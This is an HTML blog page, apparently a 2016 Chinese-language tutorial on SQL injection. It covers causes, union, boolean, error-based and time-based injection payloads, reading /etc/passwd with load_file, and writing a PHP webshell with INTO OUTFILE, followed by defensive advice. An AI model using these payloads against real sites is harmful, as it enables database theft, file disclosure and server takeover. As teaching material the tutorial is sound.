@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQL 注入 | Red</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。
+产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL 注入">
+<meta property="og:url" content="http://yoursite.com/2016/08/30/SQL注入/index.html">
+<meta property="og:site_name" content="Red">
+<meta property="og:description" content="sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。
+产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②">
+<meta property="og:updated_time" content="2016-09-18T07:42:03.864Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL 注入">
+<meta name="twitter:description" content="sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。
+产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②">
+  
+    <link rel="alternate" href="/atom.xml" title="Red" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Red</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/SQL注入/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL 注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
+<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
+<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
+<p>利用手法：</p>
+<ul>
+<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
+单引号‘显示数据库错误信息(整型、字符串类型判断) 
++1/-1回显上个页面（整型判断）
+and sleep(5) （判断网页返回时间）
+</code></pre></li>
+<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
+</code></pre></li>
+<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
+</code></pre></li>
+<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
+</ul>
+<p>根据sql数据类型分类：</p>
+<ul>
+<li>字符串类型注入和整型注入、搜索类型注入</li>
+</ul>
+<p>根据注入语法注入：</p>
+<ul>
+<li>可联合查询注入：有显示位<pre><code>order by 判断列数
+union 1，2，3 判断显示位
+</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
+?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
+</code></pre></li>
+<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
+<pre><code>exists():检查子查询是否有返回值，返回True或False
+ascii():返回字符串str的最左边字符的ascii代码值，
+substr(string,numstart,numlength):
+</code></pre><p>  例：<br>  判断有多少个数据库：</p>
+<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
+</code></pre><p>  查看第一个数据库字段的长度：</p>
+<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
+</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
+<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
+</code></pre></li>
+</ul>
+<ul>
+<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
+concat()
+(floor(rand(0)*2))a
+group by a
+</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
+</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
+</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
+</code></pre></li>
+</ul>
+<ul>
+<li>可多语句查询注入：<pre><code>sqlserver数据库
+例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
+</code></pre></li>
+<li>基于时间延迟注入：<pre><code>sleep()
+</code></pre></li>
+<li>偏移注入、宽字节注入、二次注入</li>
+</ul>
+<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<p><br></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bj9070000d4qvzr71b9ed" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/30/CSRF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CSRF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/16/read_sqlmap/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Read_Sqlmap</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Arkiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Siste innlegg</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/09/18/注入练习/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/XSS/">XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/CSRF/">CSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 xioaxin<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
